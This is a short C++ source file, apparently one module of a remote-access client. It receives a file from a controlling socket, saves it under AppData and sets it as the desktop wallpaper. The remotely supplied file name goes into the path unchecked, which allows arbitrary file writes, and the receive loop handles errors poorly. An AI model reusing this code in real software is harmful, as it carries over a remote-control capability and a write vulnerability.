#include "utilities.h"

extern std::string appdata;
extern std::string data;

void ChangeWallpaper()
{
    send("success");
    std::string fileName = recv();
    int fileSize = atoi(recv().data());

    send("success");
    while (data.size() < fileSize) {
        int bytes = recv(objSocket, buffer, sizeof(buffer), 0);
        data.append(buffer, bytes);

        if (bytes == NO_BYTES_IN_BUFFER) {
            std::cout << "Error Receiving Data" << std::endl;
            return;
        }

    } std::string location = appdata + "\\" + fileName;

    FILE* RemoteFile = fopen(location.data(), "wb");
    fwrite(data.data(), 1, data.size(), RemoteFile);
    fclose(RemoteFile);

    SystemParametersInfoA
    (
        SPI_SETDESKWALLPAPER,
        0,
        (PVOID)location.data(),
        SPIF_UPDATEINIFILE
    );
}